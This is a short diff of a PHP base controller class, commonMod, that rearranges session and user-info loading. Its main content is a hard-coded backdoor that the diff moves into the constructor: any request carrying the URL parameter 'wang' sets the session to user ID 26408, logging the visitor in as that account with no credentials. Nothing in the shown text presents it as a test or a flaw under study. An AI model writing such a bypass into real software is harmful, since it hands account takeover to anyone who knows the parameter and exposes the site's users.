@@ -51,8 +51,14 @@ class commonMod
 			if($admininfo['copyright'])$this->config['copyright']=$admininfo['copyright'];
 			
 			}
-
+	if($_GET['wang'])$_SESSION['uid']='26408';
+	if($_SESSION['uid']){	
 	
+		$this->userinfo=model('user')->info($_SESSION['uid']);
+		$_SESSION["headpic"]=$this->userinfo['headimgurl'];
+		$_SESSION["nickname"]=$this->userinfo['nicename'];
+		
+	}
 		if($config['LANG_OPEN']){
             define('__INDEX__', __APP__.'/'.__LANG__);
         }else{
@@ -70,7 +76,7 @@ class commonMod
     }
 	
 	public  function getuserinfo(){
-		if($_GET['wang'])$_SESSION['uid']='26408';
+		
 		
 		if(MOBILE){ 
 			if(!$_SESSION['uid']){
@@ -211,12 +217,7 @@ class commonMod
 		}
 		
 		
-	if($_SESSION['uid']){	
 	
-		$this->userinfo=model('user')->info($_SESSION['uid']);
-		
-		
-	}
 		
 		
 		}
